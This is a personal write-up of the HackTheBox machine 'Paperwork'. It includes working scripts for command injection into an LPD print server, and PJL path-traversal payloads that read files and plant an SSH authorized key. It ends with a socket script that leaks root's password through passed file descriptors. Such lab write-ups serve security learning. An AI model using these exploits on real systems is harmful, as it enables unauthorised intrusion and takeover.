# Paperwork - A HackTheBox Machine

Nah ts wasn't easy 😭

## Enumeration
- Open ports: 22,80,1515

### Port 1515

Is running an LPD server 

### Port 80

Is running a webserver containing a downloadable archive. This contains the source code to the LPD server.

## Initial Foothold

When you analyze the LPD server, you'll see that it's vulnerable to OS command injection. You can use this script to exploit it:

```python
from pwn import *
import base64
import sys

def base64_encode(sample_string: str):
    sample_string_bytes = sample_string.encode("ascii")

    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    return base64_string

cmd = "id"

if len(sys.argv) == 2:
    cmd = sys.argv[1]

io = remote("paperwork.htb", 1515)

base64cmd = base64_encode(cmd)

io.sendline(bytes([2])+b"archive_intake")
io.recv(1, timeout=2)
io.sendline(bytes([2]) + b"250")
io.recv(1, timeout=2)
command = f"JHi';echo {base64cmd} | base64 -d | bash; #".encode()
print(command)
io.sendline(command)
io.sendline(b"\x00"*250)
io.recvuntil(b"\x00\x00", timeout=5)
io.interactive()
```

This gives initial access.


## Pivoting

- Internally we can see another LPD server running on port 9100.
- We use chisel to forward it and interact with it.
- This server's code is found in `jetdirect.py`, which reveals that it's vulnerable to directory traversal since it doesn't filter out any *..* from the input path.
- We can abuse this to read files from the `archivist` user using:

```python
import socket, time

path = '0:/../user.txt'
payload = (
    f'\x1b%-12345X@PJL FSUPLOAD NAME="{path}" '
    f'OFFSET=0 SIZE=4096\r\n\x1b%-12345X'
)

s = socket.socket()
s.connect(('127.0.0.1', 9100))
s.send(payload.encode())
time.sleep(2)
s.settimeout(3)
try:
    r = s.recv(4096)
    print(r.decode(errors='ignore'))
except:
    print("timeout")
s.close()
```

- This gives the user flag
- But to gain a shell as archivist first we will create the ssh directory and then add an authorized key we create to it.

```python
import socket, time

path = '0:/../../../home/archivist/.ssh'
payload = f'\x1b%-12345X@PJL FSMKDIR NAME="{path}"\r\n\x1b%-12345X'

s = socket.socket()
s.connect(('127.0.0.1', 9100))
s.send(payload.encode())
time.sleep(2)
s.settimeout(3)
try:
    r = s.recv(4096)
    print(repr(r))    # b'OK\r\n'
except:
    print("no response")
s.close()
```

- Now we'll add our public key into the authorized keys file. Generate a key using the `ssh-keygen` command. Then run this script 

```python
import socket, time

pubkey = "your-public-key"

path = '0:/../../../home/archivist/.ssh/authorized_keys'
size = len(pubkey)
payload = (
    f'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY '
    f'NAME="{path}" SIZE={size}\r\n{pubkey}\x1b%-12345X'
)

s = socket.socket()
s.connect(('127.0.0.1', 9100))
s.send(payload.encode())
time.sleep(2)
s.settimeout(3)
try:
    r = s.recv(4096)
    print(repr(r))
except:
    print("no response (might be ok)")
s.close()
```

<!-- I got these scripts off of this writeup: https://zsc13810288137.github.io/htb-paperwork-writeups/ -->
<!-- I couldnt solve this myself -->

- Then to connect to ssh do `ssh -i your-private-key-file archivist@paperwork.htb`

## Privilege Escalation

- We can check `/etc/systemd/system/paperwork.service`

```
[Service]
ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
User=root
Group=root
```

- We can read `/usr/bin/paperwork-daemon` to see that it reads `/etc/paperwork/admin_pins.conf`, which is only accessible by root.
- If we enter a suspicious PJL command like **FSUPLOAD**, **FSDOWNLOAD** or **FSQUERY** it triggers the admin to do the following bit of code:

```python
def trigger_lockdown(conn):
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg(
        [msg],
        [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
    )
```

- So to abuse this we'll first trigger the admin by writing in a suspicious command into `commands.log` and then read the socket for the data.

```bash
echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log
```

- Now we'll read the socket and see the information:

```python
import socket, array, os

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('/run/paperwork/mgmt.sock')

# Receive message + ancillary data containing file descriptors
msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8))
print("Message:", msg)

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if (cmsg_level == socket.SOL_SOCKET and
        cmsg_type == socket.SCM_RIGHTS):
        fds = array.array("i")
        fds.frombytes(cmsg_data)
        for fd in fds:
            data = os.pread(fd, 1024, 0)
            print(f"FD {fd}: {data.decode()}")

s.close()
```

- This leaks the root password which allows for root access.
- All in all lot of learning from this box, am happy it's different from the usual standard of htb boxes :)
